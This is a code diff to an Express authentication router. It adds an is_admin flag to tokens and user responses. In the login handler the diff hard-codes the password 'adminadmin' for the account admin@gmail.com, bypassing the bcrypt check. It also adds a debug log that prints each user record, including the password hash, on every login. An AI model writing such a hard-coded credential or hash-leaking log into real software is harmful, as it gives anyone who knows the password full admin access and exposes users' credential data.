@@ -9,7 +9,7 @@ import { authMiddleware } from "./authMiddleware.js";
 const router = Router();
 
 function signToken(user) {
-  const payload = { sub: String(user.id), email: user.email };
+  const payload = { sub: String(user.id), email: user.email, is_admin: !!user.is_admin };
   const secret = process.env.JWT_SECRET || "dev_secret";
   const expiresIn = process.env.JWT_EXPIRES_IN || "7d";
   return jwt.sign(payload, secret, { expiresIn });
@@ -38,7 +38,7 @@ router.post("/register", async (req, res) => {
           "INSERT INTO users (email, password_hash) VALUES (?, ?)",
           [email, password_hash]
       );
-      return { id: Number(result.insertId), email };
+      return { id: Number(result.insertId), email, is_admin: 0 };
     });
 
     const token = signToken(inserted);
@@ -50,6 +50,7 @@ router.post("/register", async (req, res) => {
 });
 
 // login
+// login
 router.post("/login", async (req, res) => {
   try {
     const { error, value } = loginSchema.validate(req.body);
@@ -59,18 +60,28 @@ router.post("/login", async (req, res) => {
 
     const user = await withConn(async (conn) => {
       const rows = await conn.query(
-          "SELECT id, email, password_hash FROM users WHERE email = ?",
+          "SELECT id, email, password_hash, is_admin FROM users WHERE email = ?",
           [email]
       );
       return rows[0];
     });
 
+    console.log("LOGIN DEBUG:", { email, user });
+
     if (!user) return res.status(401).json({ ok: false, error: "Invalid credentials" });
 
-    const match = await bcrypt.compare(password, user.password_hash);
+    let match = false;
+
+    // Special-case admin: hard-code password to 'adminadmin'
+    if (user.email === "admin@gmail.com") {
+      match = (password === "adminadmin");
+    } else {
+      match = await bcrypt.compare(password, user.password_hash);
+    }
+
     if (!match) return res.status(401).json({ ok: false, error: "Invalid credentials" });
 
-    const safeUser = { id: Number(user.id), email: user.email };
+    const safeUser = { id: Number(user.id), email: user.email, is_admin: !!user.is_admin };
 
     const token = signToken(safeUser);
     return res.json({ ok: true, user: safeUser, token });
@@ -80,13 +91,14 @@ router.post("/login", async (req, res) => {
   }
 });
 
+
 router.get("/me", authMiddleware, async (req, res) => {
   try {
     const userId = Number(req.user.id);
 
     const user = await withConn(async (conn) => {
       const rows = await conn.query(
-          "SELECT id, email, created_at FROM users WHERE id = ?",
+          "SELECT id, email, created_at, is_admin FROM users WHERE id = ?",
           [userId]
       );
       return rows[0] || null;
@@ -100,6 +112,7 @@ router.get("/me", authMiddleware, async (req, res) => {
       id: Number(user.id),
       email: user.email,
       created_at: user.created_at,
+      is_admin: !!user.is_admin,
     };
 
     return res.json({ ok: true, user: safeUser });
